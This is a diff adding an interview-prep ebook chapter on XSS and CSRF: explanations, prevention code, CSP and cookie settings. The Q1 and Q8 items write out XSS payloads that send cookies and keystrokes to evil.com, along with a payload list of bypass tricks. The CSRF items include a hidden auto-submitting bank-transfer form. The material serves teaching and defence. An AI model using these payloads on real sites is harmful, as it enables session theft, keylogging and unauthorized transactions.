@@ -1336,6 +1336,216 @@ export const ebookContent: ChapterContent[] = [
     ]
   },
   {
+    id: 'web-security',
+    title: 'Web Security',
+    submodules: [
+      {
+        id: 'xss-attacks',
+        title: 'Cross Site Scripting (XSS)',
+        items: [
+          {
+            q: "Q1. What is Cross-Site Scripting (XSS)? Explain all types.",
+            a: "**Cross-Site Scripting (XSS)** is a security vulnerability where an attacker injects malicious scripts into web pages viewed by other users. The browser executes these scripts because it trusts the content from the server.\n\n**Three Main Types:**\n\n1. **Stored XSS (Persistent)**: Malicious script is permanently stored on the target server (e.g., database, forum post, comment). Every user who views the infected page executes the script.\n\n2. **Reflected XSS (Non-Persistent)**: Malicious script is reflected off the web server, typically via URL parameters or form submissions. The victim clicks a crafted link.\n\n3. **DOM-based XSS**: The vulnerability exists in client-side code. The DOM is modified by untrusted data without proper sanitization — the server never sees the malicious input.\n\n**Impact:** Cookie theft, session hijacking, keylogging, phishing, defacement, cryptocurrency mining, data exfiltration.",
+            code: `// 1. Stored XSS Example (Comment section)\n// Attacker submits this as a comment:\n// <script>fetch('https://evil.com/steal?cookie=' + document.cookie)</script>\n\n// 2. Reflected XSS Example\n// URL: https://site.com/search?q=<script>alert('XSS')</script>\n// Server renders: "You searched for: <script>alert('XSS')</script>"\n\n// 3. DOM-based XSS Example\n// URL: https://site.com/page#<img src=x onerror=alert('XSS')>\nconst hash = location.hash.substring(1);\ndocument.getElementById('output').innerHTML = hash; // Vulnerable!\n\nconsole.log("XSS Types: Stored, Reflected, DOM-based");`,
+            playground: true,
+            diagram: `XSS Attack Flow\n\nStored XSS:\n[Attacker] --submits malicious script--> [Server/DB]\n                                             |\n[Victim] <--serves infected page------------ |\n[Browser] --executes script--> [Attacker's Server]\n\nReflected XSS:\n[Attacker] --crafts malicious URL--> [Victim clicks]\n[Victim's Browser] --sends request--> [Server reflects input]\n[Browser] --executes reflected script--> [Attacker]\n\nDOM-based XSS:\n[Attacker] --crafts URL with payload in fragment/params-->\n[Victim's Browser] --reads DOM/URL, writes to innerHTML-->\n[Script executes] --no server involvement!`,
+            tags: ["Security", "XSS", "OWASP", "Frontend"],
+            followUps: [
+              "What's the difference between XSS and CSRF? How do they work together?",
+              "Why is DOM-based XSS harder to detect than Stored or Reflected XSS?",
+              "Can XSS attacks bypass HTTPS? Explain why or why not."
+            ]
+          },
+          {
+            q: "Q2. How to prevent XSS attacks? (Output Encoding & Input Validation)",
+            a: "**Defense-in-Depth Strategy:**\n\n1. **Output Encoding/Escaping** (Most Important): Convert special characters to HTML entities before rendering.\n   - `<` → `&lt;`, `>` → `&gt;`, `\"` → `&quot;`, `'` → `&#x27;`, `&` → `&amp;`\n\n2. **Input Validation**: Validate and sanitize all user input on both client and server.\n   - Whitelist allowed characters\n   - Reject unexpected input patterns\n\n3. **Use Safe APIs**: Use `textContent` instead of `innerHTML`. Use parameterized templates.\n\n4. **Content Security Policy (CSP)**: Restrict which scripts can execute.\n\n5. **HTTPOnly Cookies**: Prevent JavaScript from accessing cookies.\n\n6. **Sanitize HTML**: Use libraries like DOMPurify for rich text content.\n\n**React is safe by default** — JSX auto-escapes values. BUT `dangerouslySetInnerHTML` bypasses this protection!",
+            code: `// ❌ VULNERABLE: Using innerHTML\ndocument.getElementById('output').innerHTML = userInput;\n\n// ✅ SAFE: Using textContent\ndocument.getElementById('output').textContent = userInput;\n\n// ❌ VULNERABLE in React: dangerouslySetInnerHTML\n// <div dangerouslySetInnerHTML={{ __html: userInput }} />\n\n// ✅ SAFE in React: JSX auto-escapes\n// <div>{userInput}</div>\n\n// ✅ Output Encoding Function\nfunction escapeHTML(str) {\n  const div = document.createElement('div');\n  div.textContent = str;\n  return div.innerHTML;\n}\n\nconsole.log(escapeHTML('<script>alert("XSS")</script>'));\n// Output: &lt;script&gt;alert("XSS")&lt;/script&gt;\n\n// ✅ Using DOMPurify for rich text\n// import DOMPurify from 'dompurify';\n// const clean = DOMPurify.sanitize(dirtyHTML);\nconsole.log("Always encode output, validate input!");`,
+            playground: true,
+            tags: ["Security", "XSS", "Prevention", "Frontend", "React"],
+            followUps: [
+              "Why is output encoding more important than input validation for XSS prevention?",
+              "How does React's JSX rendering protect against XSS by default?",
+              "What are the risks of using dangerouslySetInnerHTML in React?"
+            ]
+          },
+          {
+            q: "Q3. Explain Content Security Policy (CSP) and how it prevents XSS",
+            a: "**Content Security Policy (CSP)** is an HTTP header that tells the browser which sources of content are trusted. It's a powerful defense against XSS because even if an attacker injects a script, the browser won't execute it if CSP blocks it.\n\n**Key Directives:**\n- `default-src 'self'` — Only allow resources from same origin\n- `script-src 'self' 'nonce-abc123'` — Only allow scripts with matching nonce\n- `style-src 'self' 'unsafe-inline'` — Allow inline styles (not recommended)\n- `img-src 'self' data: https:` — Allow images from self, data URIs, and HTTPS\n- `connect-src 'self' https://api.example.com` — Restrict fetch/XHR origins\n- `frame-ancestors 'none'` — Prevent clickjacking (replaces X-Frame-Options)\n\n**CSP Levels:**\n- **Level 1**: Basic whitelisting\n- **Level 2**: Nonces, hashes, strict-dynamic\n- **Level 3**: Strict CSP with 'strict-dynamic'\n\n**Report-Only Mode**: Test CSP without blocking anything — reports violations to a URL.",
+            code: `// CSP Header Examples\n\n// Basic CSP - Block all inline scripts\n// Content-Security-Policy: default-src 'self'; script-src 'self'\n\n// CSP with Nonce (recommended for modern apps)\n// Content-Security-Policy: script-src 'nonce-R4nd0mN0nc3'\n// <script nonce="R4nd0mN0nc3">/* allowed */</script>\n// <script>/* BLOCKED by CSP */</script>\n\n// Strict CSP (Google recommended)\n// Content-Security-Policy:\n//   script-src 'nonce-{random}' 'strict-dynamic';\n//   base-uri 'self';\n//   object-src 'none'\n\n// Report-Only Mode (testing)\n// Content-Security-Policy-Report-Only:\n//   default-src 'self';\n//   report-uri /csp-violation-report\n\n// Setting CSP via meta tag (limited)\n// <meta http-equiv="Content-Security-Policy"\n//       content="default-src 'self'">\n\n// Next.js CSP Header Setup\nconst cspHeader = [\n  "default-src 'self'",\n  "script-src 'self' 'nonce-abc123'",\n  "style-src 'self' 'unsafe-inline'",\n  "img-src 'self' data: https:",\n  "connect-src 'self' https://api.example.com",\n  "frame-ancestors 'none'"\n].join('; ');\n\nconsole.log("CSP Header:", cspHeader);`,
+            playground: true,
+            tags: ["Security", "CSP", "XSS", "HTTP Headers"],
+            followUps: [
+              "What's the difference between 'unsafe-inline' and 'nonce-based' CSP?",
+              "How do you implement CSP in a Next.js application?",
+              "What is 'strict-dynamic' and why does Google recommend it?"
+            ]
+          },
+          {
+            q: "Q4. DOM-based XSS: Dangerous Sinks and Sources",
+            a: "**DOM XSS** occurs when JavaScript takes data from an attacker-controllable source and passes it to a dangerous sink.\n\n**Sources (Attacker-Controlled Input):**\n- `location.href`, `location.hash`, `location.search`\n- `document.referrer`\n- `document.cookie`\n- `window.name`\n- `postMessage` data\n- Web Storage (`localStorage`, `sessionStorage`)\n\n**Sinks (Dangerous Functions):**\n- `innerHTML`, `outerHTML`\n- `document.write()`, `document.writeln()`\n- `eval()`, `Function()`, `setTimeout(string)`, `setInterval(string)`\n- `element.setAttribute('onclick', ...)`\n- `element.style.cssText`\n- jQuery: `.html()`, `.append()`, `$()`\n\n**Rule**: Never pass user-controlled data to a dangerous sink without sanitization.",
+            code: `// ❌ VULNERABLE: Using dangerous sinks with user input\n\n// Sink: innerHTML with URL hash\n// const userInput = location.hash.substring(1);\n// document.getElementById('content').innerHTML = userInput;\n\n// Sink: eval with user input\n// eval(userInput);\n\n// Sink: document.write  \n// document.write('<h1>' + userInput + '</h1>');\n\n// Sink: jQuery .html()\n// $('#content').html(userInput);\n\n// ✅ SAFE alternatives:\n\n// Use textContent instead of innerHTML\nconst safeDiv = document.createElement('div');\nsafeDiv.textContent = '<script>alert("safe")</script>';\nconsole.log("Safe output:", safeDiv.innerHTML);\n// Output: &lt;script&gt;alert("safe")&lt;/script&gt;\n\n// Use URL API for parsing URLs safely\nconst url = new URL('https://example.com/search?q=hello');\nconsole.log("Safe param:", url.searchParams.get('q'));\n\n// Never use eval - use JSON.parse instead\nconst jsonStr = '{"name": "John"}';\nconst data = JSON.parse(jsonStr);\nconsole.log("Parsed data:", data.name);`,
+            playground: true,
+            tags: ["Security", "XSS", "DOM", "Frontend"],
+            followUps: [
+              "How would you audit a large codebase for DOM-based XSS vulnerabilities?",
+              "What tools can automatically detect dangerous sinks in JavaScript?",
+              "How does using a framework like React reduce DOM-based XSS risks?"
+            ]
+          },
+          {
+            q: "Q5. XSS in React Applications — Common Pitfalls",
+            a: "**React is safe by default** because JSX escapes embedded values. However, XSS is still possible through:\n\n1. **`dangerouslySetInnerHTML`**: Bypasses React's escaping. Always sanitize with DOMPurify before using.\n\n2. **`href` with `javascript:` protocol**: React allows `javascript:` URLs in anchor tags.\n\n3. **Server-Side Rendering (SSR)**: If user data is injected into SSR HTML without escaping.\n\n4. **Third-party libraries**: Components that use `innerHTML` internally.\n\n5. **`ref` direct DOM manipulation**: Using refs to set `innerHTML` bypasses React.\n\n6. **URL parameters in `src` attributes**: Dynamic images/iframes with user-controlled URLs.\n\n**Best Practices:**\n- Avoid `dangerouslySetInnerHTML` — use DOMPurify if absolutely needed\n- Validate URLs before using in `href`/`src`\n- Use TypeScript for type safety\n- Keep dependencies updated (npm audit)\n- Implement CSP headers",
+            code: `// ❌ XSS via dangerouslySetInnerHTML\nfunction UnsafeComponent({ html }) {\n  return <div dangerouslySetInnerHTML={{ __html: html }} />;\n}\n\n// ✅ Safe: Use DOMPurify\n// import DOMPurify from 'dompurify';\nfunction SafeComponent({ html }) {\n  // const clean = DOMPurify.sanitize(html);\n  // return <div dangerouslySetInnerHTML={{ __html: clean }} />;\n  // Or better: avoid dangerouslySetInnerHTML entirely!\n  return <div>{html}</div>; // Auto-escaped by React\n}\n\n// ❌ XSS via javascript: protocol\nfunction UnsafeLink({ url }) {\n  return <a href={url}>Click me</a>;\n  // If url = "javascript:alert('XSS')", it executes!\n}\n\n// ✅ Safe: Validate URL protocol\nfunction SafeLink({ url }) {\n  const isValid = url.startsWith('https://') || url.startsWith('http://');\n  return isValid ? <a href={url}>Click me</a> : <span>Invalid URL</span>;\n}\n\nconsole.log("React auto-escapes JSX, but watch out for these pitfalls!");`,
+            playground: true,
+            tags: ["Security", "XSS", "React", "Frontend", "Google", "Meta"],
+            followUps: [
+              "How would you implement a safe rich-text editor in React?",
+              "What's the security risk of using user input in React's style attribute?",
+              "How do you prevent XSS when using React with server-side rendering?"
+            ]
+          },
+          {
+            q: "Q6. Cookie Security: HttpOnly, Secure, SameSite flags",
+            a: "**Cookie Flags for XSS & CSRF Protection:**\n\n1. **HttpOnly**: Cookie cannot be accessed by JavaScript (`document.cookie`). Prevents XSS from stealing session cookies.\n\n2. **Secure**: Cookie only sent over HTTPS. Prevents man-in-the-middle attacks.\n\n3. **SameSite**: Controls when cookies are sent with cross-site requests.\n   - `Strict`: Only sent for same-site requests (max protection)\n   - `Lax` (default): Sent for top-level GET navigations\n   - `None`: Sent for all requests (requires Secure flag)\n\n4. **Domain**: Restricts which domains receive the cookie.\n5. **Path**: Restricts which paths receive the cookie.\n6. **Max-Age/Expires**: Controls cookie lifetime.\n\n**Best Practice**: `Set-Cookie: session=abc; HttpOnly; Secure; SameSite=Strict; Path=/`",
+            code: `// Setting secure cookies (server-side)\n// Set-Cookie: sessionId=abc123;\n//   HttpOnly;    (no JS access)\n//   Secure;      (HTTPS only)\n//   SameSite=Strict; (no cross-site)\n//   Path=/;      (root path)\n//   Max-Age=3600 (1 hour)\n\n// ❌ Vulnerable cookie (no flags)\n// Set-Cookie: session=abc123\n// -> JS can read: document.cookie\n// -> Sent over HTTP\n// -> Sent on cross-site requests\n\n// Next.js API Route - Setting secure cookies\n// export async function POST(request) {\n//   const response = NextResponse.json({ success: true });\n//   response.cookies.set('session', 'abc123', {\n//     httpOnly: true,\n//     secure: true,\n//     sameSite: 'strict',\n//     maxAge: 3600,\n//     path: '/'\n//   });\n//   return response;\n// }\n\n// Checking cookie flags in browser\nconsole.log("Cookies accessible to JS:", document.cookie);\nconsole.log("HttpOnly cookies are NOT visible here!");`,
+            playground: true,
+            tags: ["Security", "Cookies", "XSS", "CSRF", "HTTP"],
+            followUps: [
+              "Why should session tokens always use HttpOnly cookies instead of localStorage?",
+              "What's the difference between SameSite=Lax and SameSite=Strict?",
+              "How do you handle cookies in a microservices architecture with different domains?"
+            ]
+          },
+          {
+            q: "Q7. Input Sanitization with DOMPurify — Implementation Guide",
+            a: "**DOMPurify** is the gold standard library for sanitizing HTML to prevent XSS. It:\n- Removes all dangerous HTML/JS\n- Allows safe HTML tags (configurable)\n- Handles edge cases and mutation XSS\n- Works in browser and Node.js\n- Is battle-tested and maintained by security researchers\n\n**When to use:**\n- Rendering user-submitted HTML (blog posts, comments)\n- Displaying Markdown-converted HTML\n- Any time you MUST use `dangerouslySetInnerHTML`\n\n**Configuration Options:**\n- `ALLOWED_TAGS`: Whitelist of allowed HTML tags\n- `ALLOWED_ATTR`: Whitelist of allowed attributes\n- `FORBID_TAGS`: Blacklist specific tags\n- `FORBID_ATTR`: Blacklist specific attributes\n- `ADD_TAGS`: Add custom elements\n- `RETURN_DOM`: Return DOM node instead of string",
+            code: `// DOMPurify Usage Examples\n// import DOMPurify from 'dompurify';\n\n// Basic sanitization\n// const dirty = '<script>alert("XSS")</script><b>Hello</b>';\n// const clean = DOMPurify.sanitize(dirty);\n// Result: '<b>Hello</b>' (script removed!)\n\n// Custom configuration\n// const clean = DOMPurify.sanitize(dirty, {\n//   ALLOWED_TAGS: ['b', 'i', 'em', 'strong', 'a', 'p', 'br'],\n//   ALLOWED_ATTR: ['href', 'title', 'class'],\n//   FORBID_TAGS: ['style', 'script', 'iframe'],\n//   FORBID_ATTR: ['onclick', 'onerror', 'style']\n// });\n\n// React Component with DOMPurify\nfunction SafeHTML({ html }) {\n  // const sanitized = DOMPurify.sanitize(html, {\n  //   ALLOWED_TAGS: ['b', 'i', 'em', 'strong', 'a', 'p', 'br', 'ul', 'li', 'code'],\n  //   ALLOWED_ATTR: ['href'],\n  // });\n  // return <div dangerouslySetInnerHTML={{ __html: sanitized }} />;\n}\n\n// Manual sanitization (without library)\nfunction basicSanitize(str) {\n  return str\n    .replace(/&/g, '&amp;')\n    .replace(/</g, '&lt;')\n    .replace(/>/g, '&gt;')\n    .replace(/"/g, '&quot;')\n    .replace(/'/g, '&#x27;');\n}\n\nconsole.log(basicSanitize('<script>alert("XSS")</script>'));\n// &lt;script&gt;alert(&quot;XSS&quot;)&lt;/script&gt;`,
+            playground: true,
+            tags: ["Security", "XSS", "DOMPurify", "Sanitization", "React"],
+            followUps: [
+              "What is mutation XSS and how does DOMPurify handle it?",
+              "When should you sanitize on the server vs the client?",
+              "How would you create a whitelist-based sanitizer from scratch?"
+            ]
+          },
+          {
+            q: "Q8. XSS Attack Payloads — What interviewers expect you to know",
+            a: "**Common XSS Payloads:**\nInterviewers often test if you understand real-world attack vectors beyond basic `<script>alert('XSS')</script>`.\n\n**Event Handler Attacks:**\n- `<img src=x onerror=alert('XSS')>`\n- `<body onload=alert('XSS')>`\n- `<svg onload=alert('XSS')>`\n- `<input onfocus=alert('XSS') autofocus>`\n\n**Attribute Injection:**\n- `<a href=\"javascript:alert('XSS')\">Click</a>`\n- `<div style=\"background:url(javascript:alert('XSS'))\">`\n\n**Encoding Bypasses:**\n- HTML entities: `&#x3C;script&#x3E;`\n- Unicode: `\\u003cscript\\u003e`\n- Double encoding: `%253Cscript%253E`\n- Mixed case: `<ScRiPt>alert('XSS')</ScRiPt>`\n\n**Why you need to know:** To build proper defenses, you must understand attack techniques. Defense without understanding attack surface is incomplete.",
+            code: `// Common XSS Payloads (for testing/defense only!)\n\n// 1. Basic script injection\n// <script>alert('XSS')</script>\n\n// 2. Event handler based (no script tag needed)\n// <img src=x onerror="alert('XSS')">\n// <svg/onload=alert('XSS')>\n// <body onload=alert('XSS')>\n\n// 3. javascript: protocol\n// <a href="javascript:alert('XSS')">click</a>\n\n// 4. Data exfiltration payload\n// <script>\n//   new Image().src = 'https://evil.com/steal?c=' + document.cookie;\n// </script>\n\n// 5. Keylogger payload\n// <script>\n//   document.onkeypress = function(e) {\n//     new Image().src = 'https://evil.com/log?k=' + e.key;\n//   };\n// </script>\n\n// Testing your defenses:\nfunction testSanitizer(sanitize) {\n  const payloads = [\n    '<script>alert(1)</script>',\n    '<img src=x onerror=alert(1)>',\n    '<svg onload=alert(1)>',\n    '<a href=\"javascript:alert(1)\">test</a>',\n    '"><script>alert(1)</script>',\n  ];\n  \n  payloads.forEach((payload, i) => {\n    console.log(\n      'Payload ' + (i+1) + ':',\n      JSON.stringify(payload),\n      '-> Safe:',\n      !sanitize(payload).includes('<script')\n    );\n  });\n}\n\n// Quick sanitizer test\nfunction sanitize(s) {\n  return s.replace(/</g, '&lt;').replace(/>/g, '&gt;');\n}\ntestSanitizer(sanitize);`,
+            playground: true,
+            tags: ["Security", "XSS", "Penetration Testing", "OWASP"],
+            followUps: [
+              "How would you test your application for XSS vulnerabilities?",
+              "What automated tools can detect XSS (SAST/DAST)?",
+              "How do WAFs (Web Application Firewalls) detect and block XSS payloads?"
+            ]
+          },
+          {
+            q: "Q9. Real-World XSS Case Studies — FAANG Interview Examples",
+            a: "**Notable XSS Incidents:**\n\n1. **MySpace Samy Worm (2005)**: First major XSS worm. Exploited innerHTML to add 1 million friends in 20 hours. Bypassed filters using CSS expression and fragmented JavaScript.\n\n2. **Twitter StalkDaily Worm (2009)**: XSS worm spread through tweets. Exploited lack of output encoding in tweet display.\n\n3. **eBay Stored XSS (2015)**: Attackers injected scripts in product listings. Stole buyer credentials via phishing overlays.\n\n4. **British Airways (2018)**: Magecart group injected credit card skimmer via XSS in payment page. 380,000 cards stolen. £20M GDPR fine.\n\n5. **Google Bug Bounty (2019)**: DOM-based XSS in Google Maps via URL parameter manipulation. Paid $5,000+ bounty.\n\n**Interview Tip:** Mentioning real-world examples shows depth. Discuss what went wrong and how to prevent similar issues.",
+            tags: ["Security", "XSS", "Case Studies", "FAANG", "Interview"],
+            followUps: [
+              "How would you explain the business impact of an XSS vulnerability to a non-technical stakeholder?",
+              "What security review process would you implement to prevent XSS in a team?",
+              "How do bug bounty programs help improve web security?"
+            ]
+          },
+          {
+            q: "Q10. Security Headers Every Frontend Developer Should Know",
+            a: "**Essential HTTP Security Headers:**\n\n1. **Content-Security-Policy (CSP)**: Controls allowed content sources\n2. **X-Content-Type-Options: nosniff**: Prevents MIME type sniffing\n3. **X-Frame-Options: DENY/SAMEORIGIN**: Prevents clickjacking\n4. **X-XSS-Protection: 0**: Disable browser XSS filter (use CSP instead)\n5. **Strict-Transport-Security (HSTS)**: Forces HTTPS\n6. **Referrer-Policy: strict-origin-when-cross-origin**: Controls referrer info\n7. **Permissions-Policy**: Controls browser features (camera, geolocation)\n8. **Cross-Origin-Opener-Policy**: Isolates browsing context\n9. **Cross-Origin-Resource-Policy**: Prevents cross-origin reads\n10. **Cross-Origin-Embedder-Policy**: Enables cross-origin isolation\n\n**Check your headers**: Use securityheaders.com to grade your site.",
+            code: `// Complete Security Headers for Next.js\n// next.config.js\nconst securityHeaders = [\n  { key: 'Content-Security-Policy',\n    value: "default-src 'self'; script-src 'self' 'nonce-{nonce}'" },\n  { key: 'X-Content-Type-Options',\n    value: 'nosniff' },\n  { key: 'X-Frame-Options',\n    value: 'DENY' },\n  { key: 'X-XSS-Protection',\n    value: '0' },\n  { key: 'Strict-Transport-Security',\n    value: 'max-age=63072000; includeSubDomains; preload' },\n  { key: 'Referrer-Policy',\n    value: 'strict-origin-when-cross-origin' },\n  { key: 'Permissions-Policy',\n    value: 'camera=(), microphone=(), geolocation=()' },\n];\n\nconsole.log("Security headers configured:");\nsecurityHeaders.forEach(h => {\n  console.log(h.key + ":", h.value.substring(0, 50) + "...");\n});`,
+            playground: true,
+            tags: ["Security", "HTTP Headers", "CSP", "HSTS", "Frontend"],
+            followUps: [
+              "Why did modern browsers deprecate the X-XSS-Protection header?",
+              "How do you implement HSTS preloading for your domain?",
+              "What is the difference between X-Frame-Options and CSP frame-ancestors?"
+            ]
+          },
+          {
+            q: "Q11. XSS Prevention Checklist — Production-Ready Security",
+            a: "**Complete XSS Prevention Checklist:**\n\n**Input Layer:**\n☑ Validate input on server-side (never trust client)\n☑ Use allow-lists over deny-lists\n☑ Validate URL protocols (block javascript:)\n☑ Limit input lengths\n\n**Output Layer:**\n☑ Context-aware output encoding (HTML, JavaScript, URL, CSS)\n☑ Use framework's auto-escaping (React JSX, Angular templates)\n☑ Sanitize rich text with DOMPurify\n☑ Avoid `innerHTML`, `eval()`, `document.write()`\n\n**HTTP Layer:**\n☑ Implement strict CSP headers\n☑ Set HttpOnly, Secure, SameSite on cookies\n☑ Use all security headers (HSTS, X-Content-Type-Options, etc.)\n\n**Architecture Layer:**\n☑ Use TypeScript for type safety\n☑ Run `npm audit` regularly\n☑ Implement automated security scanning (SAST/DAST)\n☑ Conduct code reviews with security focus\n☑ Use Subresource Integrity (SRI) for CDN scripts",
+            code: `// Subresource Integrity (SRI) Example\n// Prevents CDN compromise from injecting malicious code\n// <script\n//   src="https://cdn.example.com/lib.js"\n//   integrity="sha384-oqVuAfXRKap7fdgcCY5uykM6+R9GqQ8K/uxy9rx7HNQlGYl1kPzQho1wx4JwY8wC"\n//   crossorigin="anonymous"\n// ></script>\n\n// Automated Security Scanning Setup\nconst securityChecklist = {\n  input: [\n    'Server-side validation',\n    'Allow-list characters',\n    'URL protocol validation',\n    'Input length limits'\n  ],\n  output: [\n    'Context-aware encoding',\n    'Framework auto-escaping',\n    'DOMPurify for rich text',\n    'No innerHTML/eval'\n  ],\n  http: [\n    'Strict CSP',\n    'HttpOnly cookies',\n    'Security headers',\n    'HTTPS everywhere'\n  ],\n  architecture: [\n    'TypeScript',\n    'npm audit',\n    'SAST/DAST scanning',\n    'Security code reviews',\n    'SRI for CDN'\n  ]\n};\n\nObject.entries(securityChecklist).forEach(([layer, items]) => {\n  console.log('\\n' + layer.toUpperCase() + ' LAYER:');\n  items.forEach(item => console.log('  ☑ ' + item));\n});`,
+            playground: true,
+            tags: ["Security", "XSS", "Checklist", "Best Practices", "OWASP"],
+            followUps: [
+              "How would you integrate security testing into a CI/CD pipeline?",
+              "What's the difference between SAST and DAST? When to use each?",
+              "How do you handle security for third-party scripts and dependencies?"
+            ]
+          }
+        ]
+      },
+      {
+        id: 'csrf-attacks',
+        title: 'Cross-Site Request Forgery (CSRF)',
+        items: [
+          {
+            q: "Q1. What is Cross-Site Request Forgery (CSRF)? Explain how it works.",
+            a: "**Cross-Site Request Forgery (CSRF)** is a web security vulnerability where an attacker tricks a **logged-in user’s browser** into sending an **unwanted request** to a trusted website.\n\nBecause browsers automatically attach **cookies/session tokens** to requests, the server may treat the forged request as legitimate.\n\n**How it works (core idea):**\n1. Victim is authenticated on `bank.com` (session cookie stored).\n2. Victim visits attacker-controlled site `evil.com`.\n3. `evil.com` triggers a request (form/image/fetch) to `bank.com`.\n4. Browser auto-sends victim’s cookies to `bank.com`.\n5. Server executes the action if there is no CSRF protection.\n\n**Impact:** Unauthorized state-changing actions (change email/password, transfer money, add admin user, change settings).",
+            code: `// CSRF Example: Attacker forces a state-changing request\n// Victim is logged in to https://bank.com (cookie-based session)\n\n// Attacker page on https://evil.com\n// Auto-submitting a hidden form to bank.com\n\nconst formHtml = \`\n<form action="https://bank.com/transfer" method="POST">\n  <input type="hidden" name="to" value="attacker" />\n  <input type="hidden" name="amount" value="50000" />\n</form>\n<script>document.forms[0].submit()</script>\n\`;\n\nconsole.log('Attacker delivers this HTML to victim:', formHtml);\n\n// If bank.com relies only on cookies, the request may succeed without CSRF defenses.`,
+            playground: true,
+            diagram: `CSRF Attack Flow\n\n[Victim] logs into [bank.com]\n   | (session cookie stored)\n   v\n[Victim] visits [evil.com]\n   |\n   | evil.com triggers a POST/GET to bank.com\n   v\n[Victim Browser] --- sends request + cookies ---> [bank.com]\n   |\n   v\n[bank.com] performs action (if no CSRF protection)\n\nKey point: cookies are sent automatically by the browser.`,
+            tags: ["Security", "CSRF", "OWASP", "Backend", "Cookies"],
+            followUps: [
+              "Why is CSRF mainly a problem for cookie-based auth but not for token-in-header auth?",
+              "What’s the difference between CSRF and XSS? Can they be chained together?",
+              "How does SameSite help against CSRF and what are its limitations?"
+            ]
+          },
+          {
+            q: "Q2. CSRF vs XSS — Differences and how they can work together",
+            a: "**CSRF** forces a victim’s browser to send an authenticated request **without the victim’s intent**.\n\n**XSS** lets an attacker run JavaScript **in the victim’s browser** on a trusted site.\n\n**Key differences:**\n- **CSRF needs authentication cookies** to be automatically included by the browser.\n- **XSS bypasses CSRF tokens** because injected JS can read tokens from the page/DOM and submit valid requests.\n\n**Chaining example:**\n1) Site has XSS.\n2) Attacker’s JS reads CSRF token from DOM.\n3) Attacker sends a forged request with the valid token → CSRF defense defeated.\n\n**Takeaway:** CSRF protections help against cross-site requests, but XSS is often a game-over vulnerability (it can defeat CSRF defenses).",
+            code: `// If a site has XSS, attacker JS can often bypass CSRF protections\n\n// Example: token stored in DOM\n// <meta name="csrf-token" content="ABC123">\n\nconst token = document.querySelector('meta[name="csrf-token"]')?.content;\n\n// Attacker can then send a request including the token\nfetch('/account/change-email', {\n  method: 'POST',\n  headers: {\n    'Content-Type': 'application/json',\n    'X-CSRF-Token': token\n  },\n  body: JSON.stringify({ email: 'attacker@evil.com' })\n});\n\nconsole.log('XSS can defeat CSRF by stealing/using the token:', token);`,
+            playground: true,
+            tags: ["Security", "CSRF", "XSS", "OWASP"],
+            followUps: [
+              "If you fix only CSRF but leave XSS, what risks remain?",
+              "What common storage patterns for CSRF tokens are safer/less safe?",
+              "How would you explain CSRF vs XSS to a non-technical stakeholder?"
+            ]
+          },
+          {
+            q: "Q3. How to prevent CSRF? (SameSite, CSRF Tokens, Double Submit Cookie)",
+            a: "**Best CSRF defenses (use multiple):**\n\n1) **SameSite cookies** (great baseline)\n- `SameSite=Lax` blocks most cross-site POSTs\n- `SameSite=Strict` strongest but can break some flows\n- `SameSite=None; Secure` required for cross-site if you truly need it\n\n2) **CSRF Tokens (Synchronizer Token Pattern)**\n- Server issues per-session/per-request token\n- Token must be included in every state-changing request\n- Attacker on another site cannot read the token → request fails\n\n3) **Double Submit Cookie** (common for stateless apps)\n- Server sets a CSRF cookie\n- Client sends the same value in a header/body\n- Server checks cookie == header\n\n4) **Check Origin/Referer** (useful additional check)\n- Verify `Origin` header matches your domain for unsafe methods\n\n5) **Use proper HTTP methods**\n- Only change state on POST/PUT/PATCH/DELETE (not GET)\n\n**Rule of thumb:** SameSite + CSRF token on unsafe requests is production-grade.",
+            code: `// 1) SameSite cookie example (server sets cookie)\n// Set-Cookie: session=abc; HttpOnly; Secure; SameSite=Lax; Path=/\n\n// 2) CSRF token pattern (conceptual)\n// Server renders a hidden token in HTML:\n// <input type="hidden" name="csrf" value="RANDOM_TOKEN">\n\n// Client submits it back with POST:\n\nasync function submitForm(csrfToken) {\n  const res = await fetch('/transfer', {\n    method: 'POST',\n    headers: {\n      'Content-Type': 'application/json',\n      'X-CSRF-Token': csrfToken,\n    },\n    body: JSON.stringify({ to: 'bob', amount: 100 }),\n    credentials: 'include' // sends cookies\n  });\n  return res.ok;\n}\n\nconsole.log('CSRF defenses: SameSite + token checks on server');`,
+            playground: true,
+            tags: ["Security", "CSRF", "SameSite", "Cookies", "Backend"],
+            followUps: [
+              "When is Double Submit Cookie preferred over server-stored CSRF tokens?",
+              "How does SameSite=Lax behave for top-level navigation vs subresource requests?",
+              "Should APIs that use JWT in Authorization headers implement CSRF protection?"
+            ]
+          },
+          {
+            q: "Q4. CSRF in SPAs (React/Next.js) — Practical implementation pattern",
+            a: "**SPA reality:** If you use **cookie-based auth** in a React/Next.js app, you need CSRF protection for unsafe requests.\n\n**A clean pattern:**\n1. Server sets session cookie (`HttpOnly; Secure; SameSite=Lax/Strict`).\n2. Server exposes an endpoint like `/csrf` that returns a CSRF token.\n3. Client fetches `/csrf` once and stores token in memory (or state).\n4. Client sends token as `X-CSRF-Token` header on POST/PUT/PATCH/DELETE.\n5. Server validates token.\n\n**Extra hardening:** Verify `Origin` header + use strict CORS for APIs.",
+            code: `// Next.js / React-style client flow (conceptual)\n\nlet csrfToken = null;\n\nasync function initCsrf() {\n  const res = await fetch('/csrf', { credentials: 'include' });\n  const data = await res.json();\n  csrfToken = data.csrfToken;\n  console.log('CSRF token initialized');\n}\n\nasync function apiPost(url, body) {\n  if (!csrfToken) await initCsrf();\n\n  return fetch(url, {\n    method: 'POST',\n    credentials: 'include',\n    headers: {\n      'Content-Type': 'application/json',\n      'X-CSRF-Token': csrfToken,\n    },\n    body: JSON.stringify(body),\n  });\n}\n\napiPost('/account/update', { displayName: 'Milind' });`,
+            playground: true,
+            tags: ["Security", "CSRF", "React", "Next.js", "SPA"],
+            followUps: [
+              "Where should the CSRF token be stored in a SPA (memory vs localStorage vs cookie) and why?",
+              "How do you validate Origin/Referer on the server correctly behind a proxy?",
+              "How does CSRF work when using subdomains (api.example.com + app.example.com)?"
+            ]
+          },
+          {
+            q: "Q5. CSRF Prevention Checklist — Production-Ready",
